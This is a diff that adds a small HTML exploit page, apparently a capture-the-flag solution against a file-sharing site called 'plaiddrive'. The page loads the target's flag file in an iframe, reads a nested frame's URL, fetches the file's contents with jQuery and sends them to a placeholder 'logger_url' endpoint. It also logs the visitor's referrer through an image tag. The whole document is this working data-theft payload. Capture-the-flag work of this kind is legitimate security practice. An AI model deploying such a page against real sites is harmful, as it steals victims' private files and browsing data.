@@ -1,0 +1,20 @@
+<html>
+  <head>
+  <script src="https://code.jquery.com/jquery-2.2.3.min.js"></script>
+
+  </head>
+  <body>
+    <img src="logger_url?log_referrer" />
+    <iframe src="https://www.plaiddrive.com/view_file/flag.txt"></iframe>
+    <script>
+function xyz() {
+  var flag_url = window.frames[0].frames[0].location.href;
+  $.get(flag_url, function(data) {
+    $.get("logger_url?flag=" + encodeURIComponent(data),
+    function(data) {});
+  });
+}
+setTimeout(xyz, 1000);
+    </script>
+  </body>
+</html>
